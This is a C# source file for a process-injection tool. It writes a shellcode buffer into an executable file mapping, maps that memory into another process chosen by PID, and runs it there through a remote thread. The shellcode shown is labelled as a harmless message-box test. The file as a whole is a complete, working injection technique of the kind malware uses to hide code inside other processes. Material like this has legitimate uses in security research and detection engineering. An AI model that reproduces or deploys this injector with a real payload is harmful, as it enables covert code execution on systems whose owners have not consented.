﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static MappingInjection.NativeFunctions;
using static MappingInjection.NativeStructs;

namespace MappingInjection
{
    class MappingInjection
    {
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        static readonly UInt32 NUMA_NO_PREFERRED_NODE = 0xffffffff;
        public static bool MappingInject(int InjectProcess_pid)

        {
            /*   Messagebox shellcode   */
            byte[] buf1 = new byte[328] {
                 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
                 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
                 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
                 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
                 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
                 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
                 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
                 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
                 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
                 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
                 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
                 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
                 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
                 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
                 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
                 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
                 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
                 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
                 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
                 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
                 0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
                 0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
                 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
                 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
                 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x65, 0x6C, 0x6C, 0x6F,
                 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x20, 0x76, 0x69, 0x61, 0x20, 0x73,
                 0x79, 0x73, 0x63, 0x61, 0x6C, 0x6C, 0x00, 0x41, 0x50, 0x49, 0x20, 0x54,
                 0x65, 0x73, 0x74, 0x00
             };

            IntPtr Mapping_handle = CreateFileMapping(
                INVALID_HANDLE_VALUE, 
                IntPtr.Zero, 
                FileMapProtection.PageExecuteReadWrite, 
                0,
                (uint)buf1.Length,
                null
            );

            IntPtr MapViewOfFile_address = MapViewOfFile(Mapping_handle, FileMapAccessType.Write, 0, 0, (uint)buf1.Length);
            Marshal.Copy(buf1, 0, MapViewOfFile_address, buf1.Length);

            IntPtr OpenProcess_handle = OpenProcess((uint)ProcessAccessFlags.All, false, InjectProcess_pid);
            // Maps a view of a file or a pagefile-backed section into the address space of the specified process.
            IntPtr MapRemote_address = MapViewOfFileNuma2(
                Mapping_handle, 
                OpenProcess_handle, 
                0, 
                IntPtr.Zero, 
                0, 
                0, 
                (uint)AllocationProtect.PAGE_EXECUTE_READ,
                NUMA_NO_PREFERRED_NODE);

            uint RemoteThread_id = 0;
            IntPtr Thread_handle = CreateRemoteThread(
                OpenProcess_handle,
                IntPtr.Zero,
                0,
                MapRemote_address,
                IntPtr.Zero,
                0,
                out RemoteThread_id);

            Console.WriteLine("Remote Thread id: " + RemoteThread_id);
            // ResumeThread((IntPtr)RemoteThread_id);
            UnmapViewOfFile(MapViewOfFile_address);
            CloseHandle(OpenProcess_handle);

            if (RemoteThread_id != 0)
            {
                 return true;
            }
            else
            {
                return false;
            }
            
    
        }
    }
}
